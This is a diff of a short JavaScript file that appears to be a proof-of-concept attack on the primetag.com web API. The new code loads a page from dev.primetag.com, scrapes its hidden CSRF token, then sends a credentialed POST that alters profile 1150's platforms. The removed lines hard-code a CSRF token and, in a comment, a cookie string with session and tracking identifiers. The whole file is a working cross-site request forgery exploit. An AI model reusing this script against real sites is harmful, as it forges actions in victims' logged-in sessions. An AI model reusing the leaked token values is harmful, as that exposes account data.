@@ -1,1 +1,36 @@
-var payload={"name":"dnsleaktest.com","url":"dnsleaktest.com","audience_total":56565};/*var proxy='http://www.whateverorigin.org/get?url='//'https://cors-anywhere.herokuapp.com/';*/function postdata() {var url='/api/profiles/1150/platforms/4';var xhr=new XMLHttpRequest();xhr.onreadystatechange = function() {if(xhr.readyState==4){console.log(xhr.response);};};xhr.open('POST', url,true);xhr.setRequestHeader('X-CSRFToken', 'lVgqfI65Juek54klHovpauHb4gDYjwxbL9nPwublBfONmaKARuzREJf83Gnpicjo');/*xhr.setRequestHeader('Cookie','__cfduid=da1299b0ca2af4e20871ca72ee7e460a71543749638; _ga=GA1.2.1121066672.1543749643; fbm_286900614840287=base_domain=.primetag.com; csrftoken=3qxXjgU3S1pj5Tasl3caqhuECifsiG9AhFEvZGQIm6s8CFi7enlKENMNQ14TdRKh; _gid=GA1.2.464464987.1544029101;');*/xhr.withCredentials = "true";xhr.send(JSON.stringify(payload));};postdata();
+var payload = {
+    "name": "dnsleaktest.com",
+    "url": "dnsleaktest.com",
+    "audience_total": 56565
+};
+var token = '';
+function getcsrf(){
+    var url = 'https://dev.primetag.com/'
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            var div = document.createElement('div');
+            div.innerHTML = xhr.responseText;
+            document.body.appendChild(div);
+            token = document.querySelectorAll('[type="hidden"]')[0].value;
+        };
+    };
+    xhr.open('GET', url, true);
+    xhr.send(null);
+}
+function postdata() {
+    var url = '/api/profiles/1150/platforms/4';
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == 4) {
+            console.log(xhr.responseText);
+        };
+    };
+    xhr.open('POST', url, true);
+    console.log(token);
+    xhr.setRequestHeader('X-CSRFToken', token);
+    xhr.withCredentials = "true";
+    xhr.send(JSON.stringify(payload));
+};
+getcsrf();
+setTimeout(function(){ postdata(); }, 3000);
